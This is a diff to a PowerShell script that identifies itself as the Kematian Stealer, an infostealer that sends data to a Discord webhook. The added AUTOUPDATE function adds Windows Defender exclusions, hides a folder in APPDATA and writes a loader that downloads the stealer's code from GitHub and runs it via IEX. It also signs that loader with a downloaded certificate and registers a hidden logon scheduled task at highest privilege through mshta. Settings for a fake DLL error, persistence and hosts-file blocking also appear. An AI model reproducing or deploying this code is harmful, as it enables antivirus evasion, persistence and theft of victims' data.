@@ -1,9 +1,12 @@
+$webhook = "YOUR_WEBHOOK_HERE" # DONT USE THIS IF YOU ENABLE AUTO UPDATE INSTEAD REPLACE "PUT YOUR WEBHOOK HERE IF YOU NEED AUTOUPDATE" WITH YOUR DISCORD WEBHOOK
 $debug = $false
+$autoupdate = $false
 $blockhostsfile = $true
 $criticalprocess = $true
 $melt = $false
 $fakeerror = $false
 $persistence = $true
+
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -13,14 +16,14 @@ else {
     $ProgressPreference = 'SilentlyContinue'
 }
 
+$avatar = "https://i.imgur.com/DOIYOtp.gif"
+
 function KDMUTEX {
 	if ($fakeerror ) {Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.",'','OK','Error')}
     $AppId = "a0e59cd1-5d22-4ae1-967b-1bf3e1d36d6b" 
     $CreatedNew = $false
     $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
-    if ( -not $CreatedNew ) {
-        throw "[!] An instance of this script is already running."
-    }
+    if ( -not $CreatedNew ) { throw "[!] An instance of this script is already running."}
     else {
         if ($debug) {
             Invoke-TASKS
@@ -30,11 +33,45 @@ function KDMUTEX {
         }
     }
 }
-
 Add-Type -AssemblyName PresentationCore, PresentationFramework
 
-$webhook = "YOUR_WEBHOOK_HERE"
-$avatar = "https://i.imgur.com/DOIYOtp.gif"
+function AUTOUPDATE {
+    if ($autoupdate) { 
+    New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
+	Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian" -Force
+    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
+	$KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
+    $KDOT_DIR.attributes = "Hidden", "System"
+    $Content = @"
+`$t=(Iwr -Uri "https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/main.ps1" -useb);`$t-replace "YOUR_WEBHOOK_HERE", "PUT YOUR WEBHOOK HERE IF YOU NEED AUTOUPDATE" | IEX
+"@
+    [IO.File]::WriteAllText("$env:APPDATA\Kematian\Kematian.ps1", $Content)
+    $url = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/Kematian.pfx"
+    $outputPath = "$env:tmp\Kematian.pfx"
+    if (Test-Path $outputPath) {Remove-Item $outputPath -Force}
+    Invoke-WebRequest -Uri $url -OutFile $outputPath 
+    $certificatePath = $outputPath
+    $certificatePassword = ConvertTo-SecureString -String "Kematian" -AsPlainText -Force
+    $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certificatePath, $certificatePassword)
+    Set-AuthenticodeSignature -FilePath "$env:APPDATA\Kematian\Kematian.ps1" -Certificate $certificate -TimestampServer "http://timestamp.comodoca.com"
+    ri "$env:tmp\Kematian.pfx" -Force	
+    $task_name = "Kematian"
+    if ($debug) {
+    $task_action = New-ScheduledTaskAction -Execute "PowerShell" -Argument "-ExecutionPolicy Bypass -File %appdata%\Kematian\Kematian.ps1"
+    }
+     else {
+    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\Kematian\Kematian.ps1",0)(window.close)'
+    }
+    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
+    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
+	Start-ScheduledTask -TaskName "Kematian"
+    if ($melt) {ri $pscommandpath -force}
+    }
+    else {
+        KDMUTEX
+    }
+}
 
 #THIS CODE WAS MADE BY EvilByteCode
 Add-Type -TypeDefinition @"
@@ -1127,10 +1164,10 @@ function Invoke-TASKS {
 
 if (CHECK_AND_PATCH -eq $true) {
     if ($debug -eq $true) {
-        KDMUTEX
+        AUTOUPDATE
     }
     else {
-        KDMUTEX
+        AUTOUPDATE
     }    
     if ($debug) {
         pause
